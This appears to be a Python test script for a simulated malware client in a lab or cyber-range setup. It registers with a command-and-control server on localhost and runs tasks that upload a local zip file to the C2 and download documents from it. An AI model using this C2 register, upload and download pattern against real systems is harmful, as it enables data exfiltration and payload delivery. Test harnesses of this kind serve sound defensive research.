
import os
import time
from datetime import datetime
import c2MwUtils
import c2Client

dirpath = os.path.dirname(__file__)

class malwareTest(object):

    def __init__(self) -> None:
        self.malwareID = 'testMalware1'
        c2Ipaddr = '127.0.0.1'
        malownIP = '192.168.50.11'
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, ownIP=malownIP)
        self.taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'startT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'exePreT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            },
            {
                'taskID': 1,
                'taskType': 'upload',
                'startT': None,
                'repeat': 1,
                'exePreT': 0,
                'state' : c2MwUtils.TASK_A_FLG,
                'taskData': [os.path.join(dirpath, "update_installer.zip")]
            },

            {
                'taskID': 2,
                'taskType': 'download',
                'startT': None,
                'repeat': 1,
                'exePreT': 0,
                'state' : c2MwUtils.TASK_A_FLG,
                'taskData': ['2023-12-13_100327.png','NCL_SGX Service.docx']
            },
        ]
        self.c2Connector.registerToC2(taskList=self.taskList)
        self.c2Connector.start()

    def run(self):
        time.sleep(10)
        # test transfer file to C2
        print("upload file")

        for taskDict in self.taskList:
            for _ in range(taskDict['repeat']):
                if taskDict['taskType'] == 'upload' or taskDict['taskType'] == 'download':
                    time.sleep(int(taskDict['exePreT']))
                    uploadFlg = taskDict['taskType'] == 'upload'
                    self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
                    reportDict ={
                        'taskID': taskDict['taskID'],
                        'state': c2Client.TASK_F_FLG,
                        'Time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    self.c2Connector.addNewReport(reportDict)

    def stop(self):
        self.c2Connector.stop()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = malwareTest()
    time.sleep(1)
    client.run()
    for i in range(100):
        time.sleep(1)
        print(i)
    client.stop()

if __name__ == '__main__':
    main()
